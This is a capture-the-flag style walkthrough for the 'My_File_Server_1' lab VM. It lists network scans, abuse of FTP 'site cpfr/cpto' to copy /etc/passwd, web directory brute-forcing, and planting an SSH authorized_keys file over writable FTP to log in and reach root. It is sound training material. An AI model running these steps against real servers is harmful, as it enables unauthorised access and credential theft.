<div class="page">

# My_File_Server_1

\

## 

## My_File_Server_1

- **<span style="color:#237522;">My_File_Server_1</span>** :-

<!-- -->

- <span style="color:#9141ac;">Download the machine and import in vm box
  </span>:

<!-- -->

- Go to repo :
  <https://github.com/InfoSecWarrior/Offensive-Pentesting-Lab/tree/main/Vulnerable-OVA>
- Download the machine .

<!-- -->

- Import the machine in virtual box .

![](images/9-1.png)

- Find the machine ip :

<div class="codebox">

    nmap -sn 192.168.2.0/24 

</div>

![](images/9-2.png)

- Find the available port :

<div class="codebox">

    nmap -v -p- 192.168.2.179

</div>

![](images/9-3.png)

- Now try to login ftp :

<div class="codebox">

    ftp 192.168.2.179

</div>

![](images/9-4.png) Show the vsFTPd version .

<div class="codebox">

    ftp 192.168.2.179 2121

</div>

![](images/9-5.png)

- Now again login port 2121 and run the command :

<div class="codebox">

    ftp 192.168.2.179 2121

</div>

<div class="codebox">

    ?

</div>

![](images/9-6.png)

<div class="codebox">

    site help

</div>

<div class="codebox">

    site cpfr /etc/passwd

</div>

<div class="codebox">

    site cpto /var/ftp/pub/passwd

</div>

![](images/9-7.png)

- Now exit and again login :

![](images/9-8.png)

![](images/9-9.png)

- Now download the passwd file and see the content :

![](images/9-10.png)

![](images/9-11.png) Here the passwd file content .

- Visit the ip in browser : <http://192.168.2.179/>

![](images/9-12.png)

- Find the hidden endpoints :

<div class="codebox">

    feroxbuster -u http://192.168.2.179/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

</div>

![](images/9-13.png)

- Visit the endpoints : <http://192.168.2.179/index.html>
  <http://192.168.2.179/readme.txt>

![](images/9-14.png)

- Login ftp with local user :

![](images/9-15.png) After login make .ssh directory not .ss directory .

- Now place rsa key :

<div class="codebox">

    ssh-keygen -b 2048 -t rsa -f ./id_rsa -q -N ""

</div>

![](images/9-16.png)

- id_rsa.pub file place in server :

<div class="codebox">

    cp id_rsa.pub authorized_keys

</div>

- In ftp user :

<div class="codebox">

    lcd Downloads

</div>

- 

<div class="codebox">

    cd .ssh

</div>

- 

<div class="codebox">

    put authorized_keys

</div>

![](images/9-17.png)

- Note : Isme write ki power thi isliye file le gye .

<!-- -->

- Now login with ssh :

<div class="codebox">

    ssh smbuser@192.168.2.179 -i id_rsa

</div>

![](images/9-18.png)

- Login with root :

![](images/9-19.png)

</div>
